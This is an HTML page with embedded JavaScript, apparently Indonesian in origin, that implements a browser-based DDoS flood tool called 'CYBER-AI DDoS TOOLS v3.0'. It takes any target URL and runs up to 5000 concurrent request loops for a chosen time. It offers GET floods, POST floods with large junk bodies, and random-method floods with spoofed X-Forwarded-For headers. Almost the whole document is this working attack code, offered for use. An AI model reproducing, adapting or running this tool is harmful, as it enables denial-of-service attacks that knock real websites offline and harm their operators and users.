<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYBER-AI DDoS TOOLS v3.0</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .container {
            background: #111;
            border: 2px solid #00ff41;
            padding: 30px;
            width: 650px;
            box-shadow: 0 0 30px #00ff4133, inset 0 0 30px #00ff4111;
            border-radius: 5px;
        }
        h1 {
            text-align: center;
            font-size: 22px;
            letter-spacing: 3px;
            text-shadow: 0 0 15px #00ff41;
            margin-bottom: 5px;
        }
        .sub {
            text-align: center;
            font-size: 11px;
            color: #888;
            margin-bottom: 25px;
            letter-spacing: 1px;
        }
        .input-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            font-size: 13px;
            margin-bottom: 6px;
            letter-spacing: 1px;
        }
        input, select {
            width: 100%;
            padding: 12px;
            background: #0d0d0d;
            border: 1px solid #00ff41;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            outline: none;
        }
        input:focus, select:focus {
            box-shadow: 0 0 15px #00ff4166;
            border-color: #00ff41;
        }
        select option {
            background: #0d0d0d;
            color: #00ff41;
        }
        .btn-attack {
            width: 100%;
            padding: 15px;
            background: #00ff41;
            color: #000;
            border: none;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            font-weight: bold;
            letter-spacing: 2px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-attack:hover {
            background: #00cc33;
            box-shadow: 0 0 25px #00ff41;
        }
        .btn-stop {
            width: 100%;
            padding: 12px;
            background: #ff0040;
            color: #fff;
            border: none;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            font-weight: bold;
            letter-spacing: 2px;
            cursor: pointer;
            margin-top: 10px;
            display: none;
        }
        .log-box {
            background: #050505;
            border: 1px solid #333;
            height: 200px;
            margin-top: 20px;
            padding: 12px;
            overflow-y: auto;
            font-size: 11px;
            line-height: 1.6;
        }
        .stats {
            display: flex;
            justify-content: space-between;
            margin-top: 12px;
            font-size: 12px;
        }
        .stat {
            background: #0d0d0d;
            padding: 8px 15px;
            border: 1px solid #333;
        }
        .stat span {
            color: #ff0040;
            font-weight: bold;
        }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #050505; }
        ::-webkit-scrollbar-thumb { background: #00ff41; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ CYBER-AI DDoS ⚡</h1>
        <p class="sub">MULTI-THREAD FLOOD ENGINE v3.0</p>
        
        <div class="input-group">
            <label>🎯 TARGET URL:</label>
            <input type="text" id="target" placeholder="https://target.com/">
        </div>
        
        <div class="input-group">
            <label>🔥 THREADS:</label>
            <select id="threads">
                <option value="100">100 Threads - Low</option>
                <option value="500">500 Threads - Medium</option>
                <option value="1000" selected>1000 Threads - High</option>
                <option value="2000">2000 Threads - Extreme</option>
                <option value="5000">5000 Threads - MAXIMUM</option>
            </select>
        </div>
        
        <div class="input-group">
            <label>⏱️ DURATION (seconds):</label>
            <input type="number" id="duration" value="60" min="1" max="999999">
        </div>
        
        <div class="input-group">
            <label>🌊 METHOD:</label>
            <select id="method">
                <option value="GET">GET Flood</option>
                <option value="POST">POST Flood</option>
                <option value="RANDOM">RANDOM Header Flood</option>
            </select>
        </div>
        
        <button class="btn-attack" id="attackBtn" onclick="startAttack()">💣 MULAI SERANGAN</button>
        <button class="btn-stop" id="stopBtn" onclick="stopAttack()">🛑 STOP SERANGAN</button>
        
        <div class="stats">
            <div class="stat">📤 Requests: <span id="reqCount">0</span></div>
            <div class="stat">❌ Errors: <span id="errCount">0</span></div>
            <div class="stat">⚡ Rate: <span id="rate">0</span>/s</div>
        </div>
        
        <div class="log-box" id="logBox"></div>
    </div>

    <script>
        let attackInterval = null;
        let stopFlag = false;
        let totalRequests = 0;
        let totalErrors = 0;
        let startTime = 0;

        function log(msg) {
            const logBox = document.getElementById('logBox');
            const time = new Date().toLocaleTimeString();
            logBox.innerHTML += `<span style="color:#666;">[${time}]</span> ${msg}<br>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        function updateStats() {
            document.getElementById('reqCount').textContent = totalRequests;
            document.getElementById('errCount').textContent = totalErrors;
            const elapsed = (Date.now() - startTime) / 1000;
            const rate = elapsed > 0 ? Math.floor(totalRequests / elapsed) : 0;
            document.getElementById('rate').textContent = rate;
        }

        async function floodGET(target) {
            try {
                await fetch(target + '?' + Math.random(), {
                    mode: 'no-cors',
                    cache: 'no-store'
                });
                totalRequests++;
                return true;
            } catch(e) {
                totalErrors++;
                return false;
            }
        }

        async function floodPOST(target) {
            try {
                await fetch(target, {
                    method: 'POST',
                    mode: 'no-cors',
                    cache: 'no-store',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'data=' + Math.random().toString(36).repeat(500)
                });
                totalRequests++;
                return true;
            } catch(e) {
                totalErrors++;
                return false;
            }
        }

        async function floodRANDOM(target) {
            const methods = ['GET', 'POST', 'HEAD', 'PUT'];
            const randMethod = methods[Math.floor(Math.random() * methods.length)];
            try {
                await fetch(target + '?' + Math.random(), {
                    method: randMethod,
                    mode: 'no-cors',
                    cache: 'no-store',
                    headers: {
                        'X-Forwarded-For': Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255),
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });
                totalRequests++;
                return true;
            } catch(e) {
                totalErrors++;
                return false;
            }
        }

        function startAttack() {
            const target = document.getElementById('target').value.trim();
            if (!target) {
                log('❌ MASUKIN TARGET DULU GOBLOK!');
                return;
            }

            stopFlag = false;
            totalRequests = 0;
            totalErrors = 0;
            startTime = Date.now();
            
            const threads = parseInt(document.getElementById('threads').value);
            const duration = parseInt(document.getElementById('duration').value) * 1000;
            const method = document.getElementById('method').value;
            
            document.getElementById('attackBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'block';
            document.getElementById('logBox').innerHTML = '';
            
            log(`🚀 MULAI SERANGAN KE: ${target}`);
            log(`🔥 Threads: ${threads} | ⏱️ Duration: ${duration/1000}s | 🌊 Method: ${method}`);
            log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
            
            let floodFn;
            if (method === 'GET') floodFn = floodGET;
            else if (method === 'POST') floodFn = floodPOST;
            else floodFn = floodRANDOM;
            
            // Jalankan per thread
            for (let i = 0; i < threads; i++) {
                (async function loop() {
                    while (!stopFlag) {
                        await floodFn(target);
                    }
                })();
            }
            
            // Update stats setiap detik
            attackInterval = setInterval(() => {
                updateStats();
                if (totalRequests % 1000 === 0 && totalRequests > 0) {
                    log(`📤 ${totalRequests.toLocaleString()} requests terkirim...`);
                }
            }, 1000);
            
            // Auto stop
            setTimeout(() => {
                stopAttack();
                log(`✅ SERANGAN SELESAI. Total: ${totalRequests.toLocaleString()} requests`);
            }, duration);
        }

        function stopAttack() {
            stopFlag = true;
            clearInterval(attackInterval);
            document.getElementById('attackBtn').style.display = 'block';
            document.getElementById('stopBtn').style.display = 'none';
            updateStats();
            log('🛑 SERANGAN DIHENTIKAN!');
        }
    </script>
</body>
</html>
